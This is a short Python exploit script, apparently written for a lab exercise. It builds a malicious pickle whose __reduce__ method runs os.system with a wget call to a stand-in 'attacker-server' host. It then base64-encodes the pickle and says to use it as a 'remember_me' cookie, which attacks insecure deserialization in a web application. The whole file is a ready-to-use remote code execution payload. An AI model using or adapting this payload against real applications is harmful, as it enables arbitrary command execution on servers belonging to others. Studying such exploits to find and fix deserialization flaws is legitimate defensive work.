#!/usr/bin/env python3
import pickle
import base64
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ('wget -q -O /dev/null "http://attacker-server:8080/health?exploit=success"',))

if __name__ == "__main__":
    # Create malicious pickle object
    exploit_obj = Exploit()
    
    # Pickle with protocol 2 for Python 2 compatibility
    pickled_data = pickle.dumps(exploit_obj, protocol=2)
    
    # Base64 encode for cookie
    encoded_payload = base64.b64encode(pickled_data).decode('utf-8')
    
    print("Malicious pickle payload (base64 encoded):")
    print(encoded_payload)
    print("\nUse this as the 'remember_me' cookie value")
    print("Make sure to clear the session cookie first")
    print("\nAfter exploitation, check logs at: http://localhost:8085/logs")
    print("Look for a request to /health?exploit=success")
